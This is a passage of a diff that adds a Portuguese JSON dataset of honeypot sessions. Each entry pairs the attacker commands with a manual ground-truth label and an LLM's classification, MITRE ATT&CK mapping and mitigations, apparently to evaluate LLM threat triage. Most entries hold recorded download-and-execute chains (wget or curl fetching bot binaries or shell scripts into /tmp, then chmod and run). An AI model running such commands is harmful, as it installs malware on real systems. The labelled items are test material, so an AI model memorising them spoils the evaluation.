+      "summary": "O atacante utilizou o diretório temporário para baixar, tornar executável e executar um payload binário de forma automatizada, típico de infecção por malware ou botnet.",
+      "mitre_attack": [
+        {
+          "tactic": "Execution",
+          "technique_id": "T1204.002",
+          "technique_name": "User Execution: Malicious File",
+          "evidence": "./payload.elf"
+        },
+        {
+          "tactic": "Ingress Tool Transfer",
+          "technique_id": "T1105",
+          "technique_name": "Ingress Tool Transfer",
+          "evidence": "wget -q http://192.0.2.29/payload.elf"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 192.0.2.29 -j DROP",
+        "rm -f /dev/shm/payload.elf"
+      ],
+      "session_id": "l2_real_20_8a4d2071e618",
+      "src_ip": "192.0.2.29",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.31,
+      "comandos": [
+        "cd /dev/shm",
+        "wget -q http://192.0.2.29/payload.elf",
+        "chmod +x payload.elf",
+        "./payload.elf"
+      ]
+    }
+  },
+  {
+    "ordem": 21,
+    "session_id": "l2_real_21_3b7e5019c122",
+    "data_coleta": "2026-10-17",
+    "src_ip_mascarado_rfc5737": "192.0.2.30",
+    "comandos": [
+      "enable",
+      "system",
+      "shell",
+      "sh",
+      "/bin/busybox ECCHI"
+    ],
+    "ground_truth_inspecao_manual": "BOT_AUTOMATIZADO",
+    "classificacao_llm_nivel2": "BOT_AUTOMATIZADO",
+    "tempo_segundos_api": 2.28,
+    "resposta_crua_llm": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "ALTO",
+      "summary": "Execução direta de payload via Busybox logo após elevação de privilégio, típica de invasão automatizada por worm ou botnet.",
+      "mitre_attack": [
+        {
+          "tactic": "Execution",
+          "technique_id": "T1059",
+          "technique_name": "Command and Scripting Interpreter",
+          "evidence": "/bin/busybox ECCHI"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 192.0.2.30 -j DROP",
+        "passwd -l root"
+      ],
+      "session_id": "l2_real_21_3b7e5019c122",
+      "src_ip": "192.0.2.30",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 2.28,
+      "comandos": [
+        "enable",
+        "system",
+        "shell",
+        "sh",
+        "/bin/busybox ECCHI"
+      ]
+    }
+  },
+  {
+    "ordem": 22,
+    "session_id": "l2_real_22_5c9f3042b705",
+    "data_coleta": "2026-10-18",
+    "src_ip_mascarado_rfc5737": "192.0.2.31",
+    "comandos": [
+      "cd /tmp",
+      "wget http://192.0.2.31/bot.mips",
+      "chmod 777 bot.mips",
+      "./bot.mips"
+    ],
+    "ground_truth_inspecao_manual": "BOT_AUTOMATIZADO",
+    "classificacao_llm_nivel2": "BOT_AUTOMATIZADO",
+    "tempo_segundos_api": 2.96,
+    "resposta_crua_llm": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "ALTO",
+      "summary": "O invasor acessou o diretório temporário, baixou um binário malicioso para arquitetura MIPS via wget, concedeu permissões de execução e executou o bot de forma automatizada.",
+      "mitre_attack": [
+        {
+          "tactic": "Execution",
+          "technique_id": "T1204",
+          "technique_name": "User Execution",
+          "evidence": "./bot.mips"
+        },
+        {
+          "tactic": "Command and Control",
+          "technique_id": "T1105",
+          "technique_name": "Ingress Tool Transfer",
+          "evidence": "wget http://192.0.2.31/bot.mips"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 192.0.2.31 -j DROP",
+        "rm -f /tmp/bot.mips"
+      ],
+      "session_id": "l2_real_22_5c9f3042b705",
+      "src_ip": "192.0.2.31",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 2.96,
+      "comandos": [
+        "cd /tmp",
+        "wget http://192.0.2.31/bot.mips",
+        "chmod 777 bot.mips",
+        "./bot.mips"
+      ]
+    }
+  },
+  {
+    "ordem": 23,
+    "session_id": "l2_real_23_9d2a6085f311",
+    "data_coleta": "2026-10-19",
+    "src_ip_mascarado_rfc5737": "192.0.2.32",
+    "comandos": [
+      "cat /proc/cpuinfo",
+      "uname -s -v -n -r -m"
+    ],
+    "ground_truth_inspecao_manual": "BOT_AUTOMATIZADO",
+    "classificacao_llm_nivel2": "BOT_AUTOMATIZADO",
+    "tempo_segundos_api": 2.84,
+    "resposta_crua_llm": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "MÉDIO",
+      "summary": "Coleta automatizada de informações do sistema operacional e hardware através de comandos básicos de reconhecimento.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "cat /proc/cpuinfo, uname -s -v -n -r -m"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 192.0.2.32 -j DROP"
+      ],
+      "session_id": "l2_real_23_9d2a6085f311",
+      "src_ip": "192.0.2.32",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 2.84,
+      "comandos": [
+        "cat /proc/cpuinfo",
+        "uname -s -v -n -r -m"
+      ]
+    }
+  },
+  {
+    "ordem": 24,
+    "session_id": "l2_real_24_1e6b4018a529",
+    "data_coleta": "2026-10-20",
+    "src_ip_mascarado_rfc5737": "192.0.2.33",
+    "comandos": [
+      "cd /tmp",
+      "curl -O http://192.0.2.33/drop.sh",
+      "chmod +x drop.sh",
+      "sh drop.sh"
+    ],
+    "ground_truth_inspecao_manual": "BOT_AUTOMATIZADO",
+    "classificacao_llm_nivel2": "BOT_AUTOMATIZADO",
+    "tempo_segundos_api": 1.66,
+    "resposta_crua_llm": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "ALTO",
+      "summary": "O invasor acessou o diretório temporário, baixou um script remoto via curl, concedeu permissão de execução e o executou imediatamente, comportamento típico de infecção automatizada por malware ou botnet.",
+      "mitre_attack": [
+        {
+          "tactic": "Execution",
+          "technique_id": "T1059.004",
+          "technique_name": "Command and Scripting Interpreter: Unix Shell",
+          "evidence": "sh drop.sh"
+        },
+        {
+          "tactic": "Ingress Tool Transfer",
+          "technique_id": "T1105",
+          "technique_name": "Ingress Tool Transfer",
+          "evidence": "curl -O http://192.0.2.33/drop.sh"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 192.0.2.33 -j DROP",
+        "rm -f /tmp/drop.sh"
+      ],
+      "session_id": "l2_real_24_1e6b4018a529",
+      "src_ip": "192.0.2.33",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.66,
+      "comandos": [
+        "cd /tmp",
+        "curl -O http://192.0.2.33/drop.sh",
+        "chmod +x drop.sh",
+        "sh drop.sh"
+      ]
+    }
+  },
+  {
+    "ordem": 25,
+    "session_id": "l2_real_25_4f8c7093d802",
+    "data_coleta": "2026-10-21",
+    "src_ip_mascarado_rfc5737": "192.0.2.34",
+    "comandos": [
+      "cd /var/tmp",
+      "wget http://192.0.2.34/kinsing",
+      "chmod +x kinsing",
+      "./kinsing"
+    ],
+    "ground_truth_inspecao_manual": "BOT_AUTOMATIZADO",
+    "classificacao_llm_nivel2": "BOT_AUTOMATIZADO",
+    "tempo_segundos_api": 3.06,
+    "resposta_crua_llm": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "CRÍTICO",
+      "summary": "O invasor baixou e executou um script ou binário malicioso conhecido (Kinsing) no diretório temporário, indicando uma infecção automatizada por malware/mineração.",
+      "mitre_attack": [
+        {
+          "tactic": "Execution",
+          "technique_id": "T1204",
+          "technique_name": "User Execution",
+          "evidence": "./kinsing"
+        },
+        {
+          "tactic": "Ingress Tool Transfer",
+          "technique_id": "T1105",
+          "technique_name": "Ingress Tool Transfer",
+          "evidence": "wget http://192.0.2.34/kinsing"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 192.0.2.34 -j DROP",
+        "pkill -9 kinsing",
+        "rm -f /var/tmp/kinsing"
+      ],
+      "session_id": "l2_real_25_4f8c7093d802",
+      "src_ip": "192.0.2.34",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 3.06,
+      "comandos": [
+        "cd /var/tmp",
+        "wget http://192.0.2.34/kinsing",
+        "chmod +x kinsing",
+        "./kinsing"
+      ]
+    }
+  },
+  {
+    "ordem": 26,
+    "session_id": "l2_real_26_7a1d5027e416",
+    "data_coleta": "2026-10-22",
+    "src_ip_mascarado_rfc5737": "192.0.2.35",
+    "comandos": [
+      "uname -m",
+      "cat /etc/os-release"
+    ],
+    "ground_truth_inspecao_manual": "BOT_AUTOMATIZADO",
+    "classificacao_llm_nivel2": "BOT_AUTOMATIZADO",
+    "tempo_segundos_api": 2.88,
+    "resposta_crua_llm": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "MÉDIO",
+      "summary": "O invasor executou comandos iniciais de reconhecimento básico do sistema operacional e arquitetura da CPU, comportamento típico de scripts automatizados e malware preparando o terreno para infecção.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "uname -m; cat /etc/os-release"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 192.0.2.35 -j DROP",
+        "fail2ban-client set ssh-iptables banip 192.0.2.35"
+      ],
+      "session_id": "l2_real_26_7a1d5027e416",
+      "src_ip": "192.0.2.35",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 2.88,
+      "comandos": [
+        "uname -m",
+        "cat /etc/os-release"
+      ]
+    }
+  },
+  {
+    "ordem": 27,
+    "session_id": "l2_real_27_2b3e9061c708",
+    "data_coleta": "2026-10-22",
+    "src_ip_mascarado_rfc5737": "192.0.2.36",
+    "comandos": [
+      "cd /tmp",
+      "wget http://192.0.2.36/update.sh",
+      "sh update.sh"
+    ],
+    "ground_truth_inspecao_manual": "BOT_AUTOMATIZADO",
+    "classificacao_llm_nivel2": "BOT_AUTOMATIZADO",
+    "tempo_segundos_api": 1.26,
+    "resposta_crua_llm": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "ALTO",
+      "summary": "O invasor acessou o diretório temporário, baixou um script de atualização malicioso de um servidor externo via wget e executou o script imediatamente, indicando um comportamento típico de automação de botnet ou malware.",
+      "mitre_attack": [
+        {
+          "tactic": "Execution",
+          "technique_id": "T1059.004",
+          "technique_name": "Command and Scripting Interpreter: Unix Shell",
+          "evidence": "sh update.sh"
+        },
+        {
+          "tactic": "Ingress Tool Transfer",
+          "technique_id": "T1105",
+          "technique_name": "Ingress Tool Transfer",
+          "evidence": "wget http://192.0.2.36/update.sh"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 192.0.2.36 -j DROP",
+        "rm -f /tmp/update.sh",
+        "killall -u root -r update.sh"
+      ],
+      "session_id": "l2_real_27_2b3e9061c708",
+      "src_ip": "192.0.2.36",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.26,
+      "comandos": [
+        "cd /tmp",
+        "wget http://192.0.2.36/update.sh",
+        "sh update.sh"
+      ]
+    }
+  },
+  {
+    "ordem": 28,
+    "session_id": "l2_real_28_6c4f1084b920",
+    "data_coleta": "2026-10-23",
+    "src_ip_mascarado_rfc5737": "192.0.2.37",
+    "comandos": [
+      "cd /tmp",
+      "curl -O http://192.0.2.37/sys.x86",
+      "chmod 777 sys.x86",
+      "./sys.x86"
+    ],
+    "ground_truth_inspecao_manual": "BOT_AUTOMATIZADO",
+    "classificacao_llm_nivel2": "BOT_AUTOMATIZADO",
+    "tempo_segundos_api": 2.82,
+    "resposta_crua_llm": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "ALTO",
+      "summary": "O invasor realizou o download de um binário a partir de um servidor remoto utilizando curl na pasta temporária, concedeu permissões de execução e executou o arquivo imediatamente, padrão típico de infecção automatizada por malware ou minerador.",
+      "mitre_attack": [
+        {
+          "tactic": "Execution",
+          "technique_id": "T1204.002",
+          "technique_name": "User Execution: Malicious File",
+          "evidence": "./sys.x86"
+        },
+        {
+          "tactic": "Command and Control",
+          "technique_id": "T1105",
+          "technique_name": "Ingress Tool Transfer",
+          "evidence": "curl -O http://192.0.2.37/sys.x86"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 192.0.2.37 -j DROP",
+        "killall sys.x86",
+        "rm -f /tmp/sys.x86"
+      ],
+      "session_id": "l2_real_28_6c4f1084b920",
+      "src_ip": "192.0.2.37",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 2.82,
+      "comandos": [
+        "cd /tmp",
+        "curl -O http://192.0.2.37/sys.x86",
+        "chmod 777 sys.x86",
+        "./sys.x86"
+      ]
+    }
+  },
+  {
+    "ordem": 29,
+    "session_id": "l2_real_29_8d7a3052f113",
+    "data_coleta": "2026-10-24",
+    "src_ip_mascarado_rfc5737": "192.0.2.38",
+    "comandos": [
+      "cat /proc/version",
+      "uname -a"
+    ],
+    "ground_truth_inspecao_manual": "BOT_AUTOMATIZADO",
+    "classificacao_llm_nivel2": "BOT_AUTOMATIZADO",
+    "tempo_segundos_api": 1.1,
+    "resposta_crua_llm": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "BAIXO",
+      "summary": "O ator executou comandos básicos de reconhecimento do sistema operacional de forma automatizada e direta, típico de scripts de enumeração pré-exploração.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "cat /proc/version && uname -a"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 192.0.2.38 -j DROP"
+      ],
+      "session_id": "l2_real_29_8d7a3052f113",
+      "src_ip": "192.0.2.38",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.1,
+      "comandos": [
+        "cat /proc/version",
+        "uname -a"
+      ]
+    }
+  },
+  {
+    "ordem": 30,
+    "session_id": "l2_real_30_3e9b6014a207",
+    "data_coleta": "2026-10-25",
+    "src_ip_mascarado_rfc5737": "192.0.2.39",
+    "comandos": [
+      "cd /tmp",
+      "wget -q http://192.0.2.39/loader.sh",
+      "chmod +x loader.sh",
+      "./loader.sh"
+    ],
+    "ground_truth_inspecao_manual": "BOT_AUTOMATIZADO",
+    "classificacao_llm_nivel2": "BOT_AUTOMATIZADO",
+    "tempo_segundos_api": 2.46,
+    "resposta_crua_llm": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "CRÍTICO",
+      "summary": "O atacante realizou o download direto e execução de um script de carga malicioso a partir de um servidor remoto utilizando ferramentas de automação (wget), indicando atividade típica de botnet ou propagação de malware.",
+      "mitre_attack": [
+        {
+          "tactic": "Execution",
+          "technique_id": "T1059.004",
+          "technique_name": "Command and Scripting Interpreter: Unix Shell",
+          "evidence": "cd /tmp && wget -q http://192.0.2.39/loader.sh && chmod +x loader.sh && ./loader.sh"
+        },
+        {
+          "tactic": "Ingress Tool Transfer",
+          "technique_id": "T1105",
+          "technique_name": "Ingress Tool Transfer",
+          "evidence": "wget -q http://192.0.2.39/loader.sh"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 192.0.2.39 -j DROP",
+        "rm -f /tmp/loader.sh",
+        "pkill -f loader.sh"
+      ],
+      "session_id": "l2_real_30_3e9b6014a207",
+      "src_ip": "192.0.2.39",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 2.46,
+      "comandos": [
+        "cd /tmp",
+        "wget -q http://192.0.2.39/loader.sh",
+        "chmod +x loader.sh",
+        "./loader.sh"
+      ]
+    }
+  },
+  {
+    "ordem": 31,
+    "session_id": "l2_real_31_5f2c8049d625",
+    "data_coleta": "2026-10-25",
+    "src_ip_mascarado_rfc5737": "192.0.2.40",
+    "comandos": [
+      "cd /dev/shm",
+      "wget http://192.0.2.40/clean.sh",
+      "sh clean.sh"
+    ],
+    "ground_truth_inspecao_manual": "BOT_AUTOMATIZADO",
+    "classificacao_llm_nivel2": "BOT_AUTOMATIZADO",
+    "tempo_segundos_api": 1.39,
+    "resposta_crua_llm": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "ALTO",
+      "summary": "O invasor acessou o diretório temporário compartilhado, baixou um script remoto via wget e o executou imediatamente, comportamento típico de bots de infecção ou mineração.",
+      "mitre_attack": [
+        {
+          "tactic": "Execution",
+          "technique_id": "T1059.004",
+          "technique_name": "Command and Scripting Interpreter: Unix Shell",
+          "evidence": "sh clean.sh"
+        },
+        {
+          "tactic": "Ingress Tool Transfer",
+          "technique_id": "T1105",
+          "technique_name": "Ingress Tool Transfer",
+          "evidence": "wget http://192.0.2.40/clean.sh"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 192.0.2.40 -j DROP",
+        "rm -f /dev/shm/clean.sh"
+      ],
+      "session_id": "l2_real_31_5f2c8049d625",
+      "src_ip": "192.0.2.40",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.39,
+      "comandos": [
+        "cd /dev/shm",
+        "wget http://192.0.2.40/clean.sh",
+        "sh clean.sh"
+      ]
+    }
+  },
+  {
+    "ordem": 32,
+    "session_id": "l2_real_32_9a6d1073e810",
+    "data_coleta": "2026-10-26",
+    "src_ip_mascarado_rfc5737": "192.0.2.41",
+    "comandos": [
+      "cd /tmp",
+      "wget http://192.0.2.41/init.sh",
+      "chmod 777 init.sh",
+      "./init.sh"
+    ],
+    "ground_truth_inspecao_manual": "BOT_AUTOMATIZADO",
+    "classificacao_llm_nivel2": "BOT_AUTOMATIZADO",
+    "tempo_segundos_api": 1.27,
+    "resposta_crua_llm": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "ALTO",
+      "summary": "O invasor realizou o download imediato e a execução de um script de inicialização a partir de um servidor remoto no diretório temporário.",
+      "mitre_attack": [
+        {
+          "tactic": "Execution",
+          "technique_id": "T1059.004",
+          "technique_name": "Command and Scripting Interpreter: Unix Shell",
+          "evidence": "cd /tmp && wget http://192.0.2.41/init.sh && chmod 777 init.sh && ./init.sh"
+        },
+        {
+          "tactic": "Ingress Tool Transfer",
+          "technique_id": "T1105",
+          "technique_name": "Ingress Tool Transfer",
+          "evidence": "wget http://192.0.2.41/init.sh"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 192.0.2.41 -j DROP",
+        "rm -f /tmp/init.sh"
+      ],
+      "session_id": "l2_real_32_9a6d1073e810",
+      "src_ip": "192.0.2.41",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.27,
+      "comandos": [
+        "cd /tmp",
+        "wget http://192.0.2.41/init.sh",
+        "chmod 777 init.sh",
+        "./init.sh"
+      ]
+    }
+  }
+]
